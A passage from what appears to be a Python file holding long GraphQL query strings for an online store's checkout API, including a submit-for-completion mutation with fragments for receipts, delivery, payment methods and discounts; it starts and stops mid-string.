LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""



MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value 